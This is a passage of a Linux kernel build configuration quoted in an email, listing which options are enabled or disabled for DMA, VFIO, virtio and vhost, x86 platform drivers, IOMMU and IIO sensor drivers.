> # CONFIG_AMD_QDMA is not set
> # CONFIG_QCOM_HIDMA_MGMT is not set
> # CONFIG_QCOM_HIDMA is not set
> CONFIG_DW_DMAC_CORE=3Dy
> # CONFIG_DW_DMAC is not set
> # CONFIG_DW_DMAC_PCI is not set
> # CONFIG_DW_EDMA is not set
> CONFIG_HSU_DMA=3Dy
> # CONFIG_SF_PDMA is not set
> # CONFIG_INTEL_LDMA is not set
>=20
> #
> # DMA Clients
> #
> CONFIG_ASYNC_TX_DMA=3Dy
> # CONFIG_DMATEST is not set
> CONFIG_DMA_ENGINE_RAID=3Dy
>=20
> #
> # DMABUF options
> #
> CONFIG_SYNC_FILE=3Dy
> CONFIG_SW_SYNC=3Dy
> CONFIG_UDMABUF=3Dy
> CONFIG_DMABUF_MOVE_NOTIFY=3Dy
> # CONFIG_DMABUF_DEBUG is not set
> # CONFIG_DMABUF_SELFTESTS is not set
> CONFIG_DMABUF_HEAPS=3Dy
> CONFIG_DMABUF_HEAPS_SYSTEM=3Dy
> CONFIG_DMABUF_HEAPS_CMA=3Dy
> # end of DMABUF options
>=20
> CONFIG_DCA=3Dy
> # CONFIG_UIO is not set
> CONFIG_VFIO=3Dy
> CONFIG_VFIO_DEVICE_CDEV=3Dy
> # CONFIG_VFIO_GROUP is not set
> CONFIG_VFIO_VIRQFD=3Dy
> # CONFIG_VFIO_DEBUGFS is not set
>=20
> #
> # VFIO support for PCI devices
> #
> CONFIG_VFIO_PCI_CORE=3Dy
> CONFIG_VFIO_PCI_INTX=3Dy
> CONFIG_VFIO_PCI=3Dy
> # CONFIG_VFIO_PCI_VGA is not set
> # CONFIG_VFIO_PCI_IGD is not set
> # CONFIG_VIRTIO_VFIO_PCI is not set
> # end of VFIO support for PCI devices
>=20
> CONFIG_IRQ_BYPASS_MANAGER=3Dy
> # CONFIG_VIRT_DRIVERS is not set
> CONFIG_VIRTIO_ANCHOR=3Dy
> CONFIG_VIRTIO=3Dy
> CONFIG_VIRTIO_PCI_LIB=3Dy
> CONFIG_VIRTIO_PCI_LIB_LEGACY=3Dy
> CONFIG_VIRTIO_MENU=3Dy
> CONFIG_VIRTIO_PCI=3Dy
> CONFIG_VIRTIO_PCI_ADMIN_LEGACY=3Dy
> CONFIG_VIRTIO_PCI_LEGACY=3Dy
> CONFIG_VIRTIO_VDPA=3Dy
> CONFIG_VIRTIO_PMEM=3Dy
> CONFIG_VIRTIO_BALLOON=3Dy
> CONFIG_VIRTIO_MEM=3Dy
> CONFIG_VIRTIO_INPUT=3Dy
> CONFIG_VIRTIO_MMIO=3Dy
> CONFIG_VIRTIO_MMIO_CMDLINE_DEVICES=3Dy
> CONFIG_VIRTIO_DMA_SHARED_BUFFER=3Dy
> # CONFIG_VIRTIO_DEBUG is not set
> # CONFIG_VIRTIO_RTC is not set
> CONFIG_VDPA=3Dy
> CONFIG_VDPA_SIM=3Dy
> CONFIG_VDPA_SIM_NET=3Dy
> CONFIG_VDPA_SIM_BLOCK=3Dy
> # CONFIG_VDPA_USER is not set
> # CONFIG_IFCVF is not set
> # CONFIG_MLX5_VDPA_STEERING_DEBUG is not set
> CONFIG_VP_VDPA=3Dy
> # CONFIG_ALIBABA_ENI_VDPA is not set
> # CONFIG_SNET_VDPA is not set
> # CONFIG_OCTEONEP_VDPA is not set
> CONFIG_VHOST_IOTLB=3Dy
> CONFIG_VHOST_RING=3Dy
> CONFIG_VHOST_TASK=3Dy
> CONFIG_VHOST=3Dy
> CONFIG_VHOST_MENU=3Dy
> CONFIG_VHOST_NET=3Dy
> # CONFIG_VHOST_SCSI is not set
> CONFIG_VHOST_VSOCK=3Dy
> CONFIG_VHOST_VDPA=3Dy
> CONFIG_VHOST_CROSS_ENDIAN_LEGACY=3Dy
> CONFIG_VHOST_ENABLE_FORK_OWNER_CONTROL=3Dy
>=20
> #
> # Microsoft Hyper-V guest support
> #
> # CONFIG_HYPERV is not set
> # end of Microsoft Hyper-V guest support
>=20
> CONFIG_GREYBUS=3Dy
> # CONFIG_GREYBUS_BEAGLEPLAY is not set
> CONFIG_GREYBUS_ES2=3Dy
> CONFIG_COMEDI=3Dy
> # CONFIG_COMEDI_DEBUG is not set
> CONFIG_COMEDI_DEFAULT_BUF_SIZE_KB=3D2048
> CONFIG_COMEDI_DEFAULT_BUF_MAXSIZE_KB=3D20480
> # CONFIG_COMEDI_MISC_DRIVERS is not set
> # CONFIG_COMEDI_PCI_DRIVERS is not set
> # CONFIG_COMEDI_PCMCIA_DRIVERS is not set
> CONFIG_COMEDI_USB_DRIVERS=3Dy
> CONFIG_COMEDI_DT9812=3Dy
> CONFIG_COMEDI_NI_USB6501=3Dy
> CONFIG_COMEDI_USBDUX=3Dy
> CONFIG_COMEDI_USBDUXFAST=3Dy
> CONFIG_COMEDI_USBDUXSIGMA=3Dy
> CONFIG_COMEDI_VMK80XX=3Dy
> # CONFIG_COMEDI_8255_SA is not set
> # CONFIG_COMEDI_KCOMEDILIB is not set
> # CONFIG_COMEDI_TESTS is not set
> # CONFIG_GPIB is not set
> CONFIG_STAGING=3Dy
> # CONFIG_RTL8723BS is not set
>=20
> #
> # IIO staging drivers
> #
>=20
> #
> # Accelerometers
> #
> # CONFIG_ADIS16203 is not set
> # end of Accelerometers
>=20
> #
> # Analog to digital converters
> #
> # CONFIG_AD7816 is not set
> # end of Analog to digital converters
>=20
> #
> # Analog digital bi-direction converters
> #
> # CONFIG_ADT7316 is not set
> # end of Analog digital bi-direction converters
>=20
> #
> # Direct Digital Synthesis
> #
> # CONFIG_AD9832 is not set
> # CONFIG_AD9834 is not set
> # end of Direct Digital Synthesis
>=20
> #
> # Network Analyzer, Impedance Converters
> #
> # CONFIG_AD5933 is not set
> # end of Network Analyzer, Impedance Converters
> # end of IIO staging drivers
>=20
> # CONFIG_FB_SM750 is not set
> # CONFIG_STAGING_MEDIA is not set
> # CONFIG_FB_TFT is not set
> # CONFIG_MOST_COMPONENTS is not set
> # CONFIG_GREYBUS_AUDIO is not set
> # CONFIG_GREYBUS_BOOTROM is not set
> # CONFIG_GREYBUS_FIRMWARE is not set
> CONFIG_GREYBUS_HID=3Dy
> # CONFIG_GREYBUS_LOG is not set
> # CONFIG_GREYBUS_LOOPBACK is not set
> # CONFIG_GREYBUS_POWER is not set
> # CONFIG_GREYBUS_RAW is not set
> # CONFIG_GREYBUS_VIBRATOR is not set
> CONFIG_GREYBUS_BRIDGED_PHY=3Dy
> # CONFIG_GREYBUS_GPIO is not set
> # CONFIG_GREYBUS_I2C is not set
> # CONFIG_GREYBUS_SDIO is not set
> # CONFIG_GREYBUS_SPI is not set
> # CONFIG_GREYBUS_UART is not set
> CONFIG_GREYBUS_USB=3Dy
> # CONFIG_XIL_AXIS_FIFO is not set
> # CONFIG_VME_BUS is not set
> # CONFIG_GOLDFISH is not set
> # CONFIG_CHROME_PLATFORMS is not set
> # CONFIG_MELLANOX_PLATFORM is not set
> CONFIG_SURFACE_PLATFORMS=3Dy
> # CONFIG_SURFACE3_WMI is not set
> # CONFIG_SURFACE_3_POWER_OPREGION is not set
> # CONFIG_SURFACE_ACPI_NOTIFY is not set
> # CONFIG_SURFACE_AGGREGATOR_CDEV is not set
> # CONFIG_SURFACE_AGGREGATOR_HUB is not set
> CONFIG_SURFACE_AGGREGATOR_REGISTRY=3Dy
> # CONFIG_SURFACE_AGGREGATOR_TABLET_SWITCH is not set
> # CONFIG_SURFACE_DTX is not set
> # CONFIG_SURFACE_GPE is not set
> # CONFIG_SURFACE_HOTPLUG is not set
> # CONFIG_SURFACE_PLATFORM_PROFILE is not set
> # CONFIG_SURFACE_PRO3_BUTTON is not set
> CONFIG_SURFACE_AGGREGATOR=3Dy
> CONFIG_SURFACE_AGGREGATOR_BUS=3Dy
> CONFIG_X86_PLATFORM_DEVICES=3Dy
> CONFIG_WMI_BMOF=3Dy
> # CONFIG_HUAWEI_WMI is not set
> # CONFIG_X86_PLATFORM_DRIVERS_UNIWILL is not set
> # CONFIG_MXM_WMI is not set
> # CONFIG_NVIDIA_WMI_EC_BACKLIGHT is not set
> # CONFIG_XIAOMI_WMI is not set
> # CONFIG_REDMI_WMI is not set
> # CONFIG_GIGABYTE_WMI is not set
> # CONFIG_ACERHDF is not set
> # CONFIG_ACER_WIRELESS is not set
> # CONFIG_ACER_WMI is not set
>=20
> #
> # AMD HSMP Driver
> #
> # CONFIG_AMD_HSMP_ACPI is not set
> # CONFIG_AMD_HSMP_PLAT is not set
> # end of AMD HSMP Driver
>=20
> # CONFIG_AMD_PMC is not set
> # CONFIG_AMD_HFI is not set
> # CONFIG_AMD_3D_VCACHE is not set
> # CONFIG_AMD_WBRF is not set
> # CONFIG_AMD_ISP_PLATFORM is not set
> # CONFIG_ADV_SWBUTTON is not set
> # CONFIG_APPLE_GMUX is not set
> # CONFIG_ASUS_LAPTOP is not set
> # CONFIG_ASUS_WIRELESS is not set
> # CONFIG_ASUS_ARMOURY is not set
> CONFIG_ASUS_WMI=3Dy
> CONFIG_ASUS_WMI_DEPRECATED_ATTRS=3Dy
> # CONFIG_ASUS_NB_WMI is not set
> CONFIG_ASUS_TF103C_DOCK=3Dy
> # CONFIG_AYANEO_EC is not set
> CONFIG_EEEPC_LAPTOP=3Dy
> # CONFIG_EEEPC_WMI is not set
> # CONFIG_X86_PLATFORM_DRIVERS_DELL is not set
> # CONFIG_AMILO_RFKILL is not set
> # CONFIG_FUJITSU_LAPTOP is not set
> # CONFIG_FUJITSU_TABLET is not set
> # CONFIG_GPD_POCKET_FAN is not set
> # CONFIG_X86_PLATFORM_DRIVERS_HP is not set
> # CONFIG_WIRELESS_HOTKEY is not set
> # CONFIG_IBM_RTL is not set
> # CONFIG_SENSORS_HDAPS is not set
> # CONFIG_INTEL_ATOMISP2_PM is not set
> # CONFIG_INTEL_IFS is not set
> # CONFIG_INTEL_SAR_INT1092 is not set
> # CONFIG_INTEL_SKL_INT3472 is not set
>=20
> #
> # Intel Speed Select Technology interface support
> #
> # CONFIG_INTEL_SPEED_SELECT_INTERFACE is not set
> # end of Intel Speed Select Technology interface support
>=20
> # CONFIG_INTEL_WMI_SBL_FW_UPDATE is not set
> # CONFIG_INTEL_WMI_THUNDERBOLT is not set
>=20
> #
> # Intel Uncore Frequency Control
> #
> # CONFIG_INTEL_UNCORE_FREQ_CONTROL is not set
> # end of Intel Uncore Frequency Control
>=20
> # CONFIG_INTEL_HID_EVENT is not set
> # CONFIG_INTEL_VBTN is not set
> # CONFIG_INTEL_EHL_PSE_IO is not set
> # CONFIG_INTEL_INT0002_VGPIO is not set
> # CONFIG_INTEL_OAKTRAIL is not set
> # CONFIG_INTEL_BXTWC_PMIC_TMU is not set
> CONFIG_INTEL_CHTWC_INT33FE=3Dy
> CONFIG_INTEL_ISHTP_ECLITE=3Dy
> # CONFIG_INTEL_PUNIT_IPC is not set
> # CONFIG_INTEL_RST is not set
> # CONFIG_INTEL_SMARTCONNECT is not set
> # CONFIG_INTEL_TURBO_MAX_3 is not set
> # CONFIG_INTEL_VSEC is not set
> # CONFIG_IDEAPAD_LAPTOP is not set
> # CONFIG_LENOVO_WMI_HOTKEY_UTILITIES is not set
> # CONFIG_LENOVO_WMI_CAMERA is not set
> # CONFIG_THINKPAD_ACPI is not set
> # CONFIG_THINKPAD_LMI is not set
> # CONFIG_YOGABOOK is not set
> # CONFIG_YT2_1380 is not set
> # CONFIG_LENOVO_WMI_GAMEZONE is not set
> # CONFIG_LENOVO_WMI_TUNING is not set
> # CONFIG_ACPI_QUICKSTART is not set
> # CONFIG_MEEGOPAD_ANX7428 is not set
> # CONFIG_MSI_EC is not set
> # CONFIG_MSI_LAPTOP is not set
> # CONFIG_MSI_WMI is not set
> # CONFIG_MSI_WMI_PLATFORM is not set
> # CONFIG_PCENGINES_APU2 is not set
> # CONFIG_PORTWELL_EC is not set
> # CONFIG_BARCO_P50_GPIO is not set
> # CONFIG_SAMSUNG_GALAXYBOOK is not set
> # CONFIG_SAMSUNG_LAPTOP is not set
> # CONFIG_SAMSUNG_Q10 is not set
> # CONFIG_ACPI_TOSHIBA is not set
> # CONFIG_TOSHIBA_BT_RFKILL is not set
> # CONFIG_TOSHIBA_HAPS is not set
> # CONFIG_TOSHIBA_WMI is not set
> # CONFIG_ACPI_CMPC is not set
> # CONFIG_COMPAL_LAPTOP is not set
> # CONFIG_LG_LAPTOP is not set
> # CONFIG_PANASONIC_LAPTOP is not set
> # CONFIG_SONY_LAPTOP is not set
> # CONFIG_SYSTEM76_ACPI is not set
> # CONFIG_TOPSTAR_LAPTOP is not set
> # CONFIG_SERIAL_MULTI_INSTANTIATE is not set
> # CONFIG_INSPUR_PLATFORM_PROFILE is not set
> # CONFIG_DASHARO_ACPI is not set
> # CONFIG_INTEL_IPS is not set
> CONFIG_INTEL_SCU_IPC=3Dy
> # CONFIG_INTEL_SCU_PCI is not set
> # CONFIG_INTEL_SCU_PLATFORM is not set
> # CONFIG_SIEMENS_SIMATIC_IPC is not set
> # CONFIG_SILICOM_PLATFORM is not set
> # CONFIG_WINMATE_FM07_KEYS is not set
> # CONFIG_OXP_EC is not set
> # CONFIG_TUXEDO_NB04_WMI_AB is not set
> CONFIG_P2SB=3Dy
> CONFIG_ACPI_WMI=3Dy
> # CONFIG_ACPI_WMI_LEGACY_DEVICE_NAMES is not set
> CONFIG_HAVE_CLK=3Dy
> CONFIG_HAVE_CLK_PREPARE=3Dy
> CONFIG_COMMON_CLK=3Dy
> # CONFIG_LMK04832 is not set
> # CONFIG_COMMON_CLK_MAX9485 is not set
> # CONFIG_COMMON_CLK_SI5341 is not set
> # CONFIG_COMMON_CLK_SI5351 is not set
> # CONFIG_COMMON_CLK_SI514 is not set
> # CONFIG_COMMON_CLK_SI544 is not set
> # CONFIG_COMMON_CLK_SI570 is not set
> # CONFIG_COMMON_CLK_CDCE706 is not set
> # CONFIG_COMMON_CLK_CDCE925 is not set
> # CONFIG_COMMON_CLK_CS2000_CP is not set
> # CONFIG_CLK_TWL is not set
> # CONFIG_COMMON_CLK_AXI_CLKGEN is not set
> # CONFIG_COMMON_CLK_RS9_PCIE is not set
> # CONFIG_COMMON_CLK_SI521XX is not set
> # CONFIG_COMMON_CLK_VC3 is not set
> # CONFIG_COMMON_CLK_VC5 is not set
> # CONFIG_COMMON_CLK_VC7 is not set
> # CONFIG_COMMON_CLK_FIXED_MMIO is not set
> # CONFIG_CLK_LGM_CGU is not set
> # CONFIG_XILINX_VCU is not set
> # CONFIG_COMMON_CLK_XLNX_CLKWZRD is not set
> # CONFIG_HWSPINLOCK is not set
>=20
> #
> # Clock Source drivers
> #
> CONFIG_CLKEVT_I8253=3Dy
> CONFIG_I8253_LOCK=3Dy
> CONFIG_CLKBLD_I8253=3Dy
> # end of Clock Source drivers
>=20
> CONFIG_MAILBOX=3Dy
> # CONFIG_PLATFORM_MHU is not set
> CONFIG_PCC=3Dy
> # CONFIG_ALTERA_MBOX is not set
> # CONFIG_MAILBOX_TEST is not set
> CONFIG_IOMMU_IOVA=3Dy
> CONFIG_IOMMU_API=3Dy
> CONFIG_IOMMUFD_DRIVER=3Dy
> CONFIG_IOMMU_SUPPORT=3Dy
>=20
> #
> # Generic IOMMU Pagetable Support
> #
> # end of Generic IOMMU Pagetable Support
>=20
> # CONFIG_IOMMU_DEBUGFS is not set
> # CONFIG_IOMMU_DEFAULT_DMA_STRICT is not set
> CONFIG_IOMMU_DEFAULT_DMA_LAZY=3Dy
> # CONFIG_IOMMU_DEFAULT_PASSTHROUGH is not set
> CONFIG_OF_IOMMU=3Dy
> CONFIG_IOMMU_DMA=3Dy
> CONFIG_IOMMU_SVA=3Dy
> CONFIG_IOMMU_IOPF=3Dy
> # CONFIG_AMD_IOMMU is not set
> CONFIG_DMAR_TABLE=3Dy
> CONFIG_INTEL_IOMMU=3Dy
> CONFIG_INTEL_IOMMU_SVM=3Dy
> CONFIG_INTEL_IOMMU_DEFAULT_ON=3Dy
> CONFIG_INTEL_IOMMU_SCALABLE_MODE_DEFAULT_ON=3Dy
> CONFIG_INTEL_IOMMU_PERF_EVENTS=3Dy
> CONFIG_IOMMUFD_DRIVER_CORE=3Dy
> CONFIG_IOMMUFD=3Dy
> CONFIG_IRQ_REMAP=3Dy
> # CONFIG_VIRTIO_IOMMU is not set
> CONFIG_GENERIC_PT=3Dy
> # CONFIG_DEBUG_GENERIC_PT is not set
> CONFIG_IOMMU_PT=3Dy
> # CONFIG_IOMMU_PT_AMDV1 is not set
> CONFIG_IOMMU_PT_VTDSS=3Dy
> CONFIG_IOMMU_PT_X86_64=3Dy
>=20
> #
> # Remoteproc drivers
> #
> # CONFIG_REMOTEPROC is not set
> # end of Remoteproc drivers
>=20
> #
> # Rpmsg drivers
> #
> # CONFIG_RPMSG_QCOM_GLINK_RPM is not set
> # CONFIG_RPMSG_VIRTIO is not set
> # end of Rpmsg drivers
>=20
> CONFIG_SOUNDWIRE=3Dy
>=20
> #
> # SoundWire Devices
> #
> # CONFIG_SOUNDWIRE_AMD is not set
> # CONFIG_SOUNDWIRE_INTEL is not set
> # CONFIG_SOUNDWIRE_QCOM is not set
>=20
> #
> # SOC (System On Chip) specific Drivers
> #
>=20
> #
> # Amlogic SoC drivers
> #
> # end of Amlogic SoC drivers
>=20
> #
> # Broadcom SoC drivers
> #
> # end of Broadcom SoC drivers
>=20
> #
> # NXP/Freescale QorIQ SoC drivers
> #
> # end of NXP/Freescale QorIQ SoC drivers
>=20
> #
> # fujitsu SoC drivers
> #
> # end of fujitsu SoC drivers
>=20
> #
> # i.MX SoC drivers
> #
> # end of i.MX SoC drivers
>=20
> #
> # Enable LiteX SoC Builder specific drivers
> #
> # CONFIG_LITEX_SOC_CONTROLLER is not set
> # end of Enable LiteX SoC Builder specific drivers
>=20
> # CONFIG_WPCM450_SOC is not set
>=20
> #
> # Qualcomm SoC drivers
> #
> CONFIG_QCOM_QMI_HELPERS=3Dy
> # end of Qualcomm SoC drivers
>=20
> # CONFIG_SOC_TI is not set
>=20
> #
> # Xilinx SoC drivers
> #
> # end of Xilinx SoC drivers
> # end of SOC (System On Chip) specific Drivers
>=20
> #
> # PM Domains
> #
>=20
> #
> # Amlogic PM Domains
> #
> # end of Amlogic PM Domains
>=20
> #
> # Broadcom PM Domains
> #
> # end of Broadcom PM Domains
>=20
> #
> # i.MX PM Domains
> #
> # end of i.MX PM Domains
>=20
> #
> # Qualcomm PM Domains
> #
> # end of Qualcomm PM Domains
> # end of PM Domains
>=20
> # CONFIG_PM_DEVFREQ is not set
> CONFIG_EXTCON=3Dy
>=20
> #
> # Extcon Device Drivers
> #
> # CONFIG_EXTCON_ADC_JACK is not set
> # CONFIG_EXTCON_FSA9480 is not set
> # CONFIG_EXTCON_GPIO is not set
> # CONFIG_EXTCON_INTEL_INT3496 is not set
> CONFIG_EXTCON_INTEL_CHT_WC=3Dy
> # CONFIG_EXTCON_LC824206XA is not set
> # CONFIG_EXTCON_MAX3355 is not set
> # CONFIG_EXTCON_MAX14526 is not set
> CONFIG_EXTCON_PTN5150=3Dy
> # CONFIG_EXTCON_RT8973A is not set
> # CONFIG_EXTCON_SM5502 is not set
> # CONFIG_EXTCON_USB_GPIO is not set
> CONFIG_EXTCON_USBC_TUSB320=3Dy
> # CONFIG_MEMORY is not set
> CONFIG_IIO=3Dy
> CONFIG_IIO_BUFFER=3Dy
> # CONFIG_IIO_BUFFER_CB is not set
> # CONFIG_IIO_BUFFER_DMA is not set
> # CONFIG_IIO_BUFFER_DMAENGINE is not set
> # CONFIG_IIO_BUFFER_HW_CONSUMER is not set
> CONFIG_IIO_KFIFO_BUF=3Dy
> CONFIG_IIO_TRIGGERED_BUFFER=3Dy
> # CONFIG_IIO_CONFIGFS is not set
> CONFIG_IIO_TRIGGER=3Dy
> CONFIG_IIO_CONSUMERS_PER_TRIGGER=3D2
> # CONFIG_IIO_SW_DEVICE is not set
> # CONFIG_IIO_SW_TRIGGER is not set
> # CONFIG_IIO_TRIGGERED_EVENT is not set
>=20
> #
> # Accelerometers
> #
> # CONFIG_ADIS16201 is not set
> # CONFIG_ADIS16209 is not set
> # CONFIG_ADXL313_I2C is not set
> # CONFIG_ADXL313_SPI is not set
> # CONFIG_ADXL345_I2C is not set
> # CONFIG_ADXL345_SPI is not set
> # CONFIG_ADXL355_I2C is not set
> # CONFIG_ADXL355_SPI is not set
> # CONFIG_ADXL367_SPI is not set
> # CONFIG_ADXL367_I2C is not set
> # CONFIG_ADXL372_SPI is not set
> # CONFIG_ADXL372_I2C is not set
> # CONFIG_ADXL380_SPI is not set
> # CONFIG_ADXL380_I2C is not set
> # CONFIG_BMA180 is not set
> # CONFIG_BMA220 is not set
> # CONFIG_BMA400 is not set
> # CONFIG_BMC150_ACCEL is not set
> # CONFIG_BMI088_ACCEL is not set
> # CONFIG_DA280 is not set
> # CONFIG_DA311 is not set
> # CONFIG_DMARD06 is not set
> # CONFIG_DMARD09 is not set
> # CONFIG_DMARD10 is not set
> # CONFIG_FXLS8962AF_I2C is not set
> # CONFIG_FXLS8962AF_SPI is not set
> CONFIG_HID_SENSOR_ACCEL_3D=3Dy
> # CONFIG_IIO_ST_ACCEL_3AXIS is not set
> # CONFIG_IIO_KX022A_SPI is not set
> # CONFIG_IIO_KX022A_I2C is not set
> # CONFIG_KXSD9 is not set
> # CONFIG_KXCJK1013 is not set
> # CONFIG_MC3230 is not set
> # CONFIG_MMA7455_I2C is not set
> # CONFIG_MMA7455_SPI is not set
> # CONFIG_MMA7660 is not set
> # CONFIG_MMA8452 is not set
> # CONFIG_MMA9551 is not set
> # CONFIG_MMA9553 is not set
> # CONFIG_MSA311 is not set
> # CONFIG_MXC4005 is not set
> # CONFIG_MXC6255 is not set
> # CONFIG_SCA3000 is not set
> # CONFIG_SCA3300 is not set
> # CONFIG_STK8312 is not set
> # CONFIG_STK8BA50 is not set
> # end of Accelerometers
>=20
> #
> # Analog to digital converters
> #
> # CONFIG_AD4000 is not set
> # CONFIG_AD4030 is not set
> # CONFIG_AD4080 is not set
> # CONFIG_AD4130 is not set
> # CONFIG_AD4134 is not set
> # CONFIG_AD4170_4 is not set
> # CONFIG_AD4695 is not set
> # CONFIG_AD7091R5 is not set
> # CONFIG_AD7091R8 is not set
> # CONFIG_AD7124 is not set
> # CONFIG_AD7173 is not set
> # CONFIG_AD7191 is not set
> # CONFIG_AD7192 is not set
> # CONFIG_AD7266 is not set
> # CONFIG_AD7280 is not set
> # CONFIG_AD7291 is not set
> # CONFIG_AD7292 is not set
> # CONFIG_AD7298 is not set
> # CONFIG_AD7380 is not set
> # CONFIG_AD7476 is not set
> # CONFIG_AD7606_IFACE_PARALLEL is not set
> # CONFIG_AD7606_IFACE_SPI is not set
> # CONFIG_AD7766 is not set
> # CONFIG_AD7768_1 is not set
> # CONFIG_AD7779 is not set
> # CONFIG_AD7780 is not set
> # CONFIG_AD7791 is not set
> # CONFIG_AD7793 is not set
> # CONFIG_AD7887 is not set
> # CONFIG_AD7923 is not set
> # CONFIG_AD7944 is not set
> # CONFIG_AD7949 is not set
> # CONFIG_AD799X is not set
> # CONFIG_AD9467 is not set
> # CONFIG_ADE9000 is not set
> # CONFIG_CC10001_ADC is not set
> CONFIG_DLN2_ADC=3Dy
> # CONFIG_ENVELOPE_DETECTOR is not set
> # CONFIG_GEHC_PMC_ADC is not set
> # CONFIG_HI8435 is not set
> # CONFIG_HX711 is not set
> # CONFIG_INA2XX_ADC is not set
> # CONFIG_LTC2309 is not set
> # CONFIG_LTC2471 is not set
> # CONFIG_LTC2485 is not set
> # CONFIG_LTC2496 is not set
> # CONFIG_LTC2497 is not set
> # CONFIG_MAX1027 is not set
> # CONFIG_MAX11100 is not set
> # CONFIG_MAX1118 is not set
> # CONFIG_MAX11205 is not set
> # CONFIG_MAX11410 is not set
> # CONFIG_MAX1241 is not set
> # CONFIG_MAX1363 is not set
> # CONFIG_MAX14001 is not set
> # CONFIG_MAX34408 is not set
> # CONFIG_MAX9611 is not set
> # CONFIG_MCP320X is not set
> # CONFIG_MCP3422 is not set
> # CONFIG_MCP3564 is not set
> # CONFIG_MCP3911 is not set
> # CONFIG_MEDIATEK_MT6360_ADC is not set
> # CONFIG_MEDIATEK_MT6370_ADC is not set
> # CONFIG_NAU7802 is not set
> # CONFIG_NCT7201 is not set
> # CONFIG_PAC1921 is not set
> # CONFIG_PAC1934 is not set
> # CONFIG_ROHM_BD79112 is not set
> # CONFIG_ROHM_BD79124 is not set
> # CONFIG_RICHTEK_RTQ6056 is not set
> # CONFIG_SD_ADC_MODULATOR is not set
> # CONFIG_TI_ADC081C is not set
> # CONFIG_TI_ADC0832 is not set
> # CONFIG_TI_ADC084S021 is not set
> # CONFIG_TI_ADC108S102 is not set
> # CONFIG_TI_ADC12138 is not set
> # CONFIG_TI_ADC128S052 is not set
> # CONFIG_TI_ADC161S626 is not set
> # CONFIG_TI_ADS1015 is not set
> # CONFIG_TI_ADS1018 is not set
> # CONFIG_TI_ADS1100 is not set
> # CONFIG_TI_ADS1119 is not set
> # CONFIG_TI_ADS124S08 is not set
> # CONFIG_TI_ADS1298 is not set
> # CONFIG_TI_ADS131E08 is not set
> # CONFIG_TI_ADS131M02 is not set
> # CONFIG_TI_ADS7138 is not set
> # CONFIG_TI_ADS7924 is not set
> # CONFIG_TI_ADS7950 is not set
> # CONFIG_TI_ADS8344 is not set
> # CONFIG_TI_ADS8688 is not set
> # CONFIG_TI_LMP92064 is not set
> # CONFIG_TI_TLC4541 is not set
> # CONFIG_TI_TSC2046 is not set
> # CONFIG_TWL4030_MADC is not set
> # CONFIG_TWL6030_GPADC is not set
> # CONFIG_VF610_ADC is not set
> CONFIG_VIPERBOARD_ADC=3Dy
> # CONFIG_XILINX_XADC is not set
> # end of Analog to digital converters
>=20
> #
> # Analog to digital and digital to analog converters
> #
> # CONFIG_AD74115 is not set
> # CONFIG_AD74413R is not set
> # end of Analog to digital and digital to analog converters
>=20
> #
> # Analog Front Ends
> #
> # CONFIG_IIO_RESCALE is not set
> # end of Analog Front Ends
>=20
> #
> # Amplifiers
> #
> # CONFIG_AD8366 is not set
> # CONFIG_ADA4250 is not set
> # CONFIG_ADL8113 is not set
> # CONFIG_HMC425 is not set
> # end of Amplifiers
>=20
> #
> # Capacitance to digital converters
> #
> # CONFIG_AD7150 is not set
> # CONFIG_AD7746 is not set
> # end of Capacitance to digital converters
>=20
> #
> # Chemical Sensors
> #
> # CONFIG_AOSONG_AGS02MA is not set
> # CONFIG_ATLAS_PH_SENSOR is not set
> # CONFIG_ATLAS_EZO_SENSOR is not set
> # CONFIG_BME680 is not set
> # CONFIG_CCS811 is not set
> # CONFIG_ENS160 is not set
> # CONFIG_IAQCORE is not set
> # CONFIG_MHZ19B is not set
> # CONFIG_PMS7003 is not set
> # CONFIG_SCD30_CORE is not set
> # CONFIG_SCD4X is not set
> # CONFIG_SEN0322 is not set
> # CONFIG_SENSIRION_SGP30 is not set
> # CONFIG_SENSIRION_SGP40 is not set
> # CONFIG_SPS30_I2C is not set
> # CONFIG_SPS30_SERIAL is not set
> # CONFIG_SENSEAIR_SUNRISE_CO2 is not set
> # CONFIG_VZ89X is not set
> # end of Chemical Sensors
>=20
> #
> # Hid Sensor IIO Common
> #
> CONFIG_HID_SENSOR_IIO_COMMON=3Dy
> CONFIG_HID_SENSOR_IIO_TRIGGER=3Dy
> # end of Hid Sensor IIO Common
>=20
> #
> # IIO SCMI Sensors
> #
> # end of IIO SCMI Sensors
>=20
> #
> # SSP Sensor Common
> #
> # CONFIG_IIO_SSP_SENSORHUB is not set
> # end of SSP Sensor Common
>=20
> #
> # Digital to analog converters
> #
> # CONFIG_AD3530R is not set
> # CONFIG_AD3552R_HS is not set
> # CONFIG_AD3552R is not set
> # CONFIG_AD5064 is not set
> # CONFIG_AD5360 is not set
> # CONFIG_AD5380 is not set
> # CONFIG_AD5421 is not set
> # CONFIG_AD5446_SPI is not set
> # CONFIG_AD5446_I2C is not set
> # CONFIG_AD5449 is not set
> # CONFIG_AD5592R is not set
> # CONFIG_AD5593R is not set
> # CONFIG_AD5504 is not set
> # CONFIG_AD5624R_SPI is not set
> # CONFIG_AD9739A is not set
> # CONFIG_LTC2688 is not set
> # CONFIG_AD5686_SPI is not set
> # CONFIG_AD5696_I2C is not set
> # CONFIG_AD5755 is not set
> # CONFIG_AD5758 is not set
> # CONFIG_AD5761 is not set
> # CONFIG_AD5764 is not set
> # CONFIG_AD5766 is not set
> # CONFIG_AD5770R is not set
> # CONFIG_AD5791 is not set
> # CONFIG_AD7293 is not set
> # CONFIG_AD7303 is not set
> # CONFIG_AD8460 is not set
> # CONFIG_AD8801 is not set
> # CONFIG_BD79703 is not set
> # CONFIG_DPOT_DAC is not set
> # CONFIG_DS4424 is not set
> # CONFIG_LTC1660 is not set
> # CONFIG_LTC2632 is not set
> # CONFIG_LTC2664 is not set
> # CONFIG_M62332 is not set
> # CONFIG_MAX517 is not set
> # CONFIG_MAX22007 is not set
> # CONFIG_MAX5522 is not set
> # CONFIG_MAX5821 is not set
> # CONFIG_MCP4725 is not set
> # CONFIG_MCP4728 is not set
> # CONFIG_MCP47FEB02 is not set
> # CONFIG_MCP4821 is not set
> # CONFIG_MCP4922 is not set
> # CONFIG_TI_DAC082S085 is not set
> # CONFIG_TI_DAC5571 is not set
> # CONFIG_TI_DAC7311 is not set
> # CONFIG_TI_DAC7612 is not set
> # CONFIG_VF610_DAC is not set
> # end of Digital to analog converters
>=20
> #
> # IIO dummy driver
> #
> # end of IIO dummy driver
>=20
> #
> # Filters
> #
> # CONFIG_ADMV8818 is not set
> # end of Filters
>=20
> #
> # Frequency Synthesizers DDS/PLL
> #
>=20
> #
> # Clock Generator/Distribution
> #
> # CONFIG_AD9523 is not set
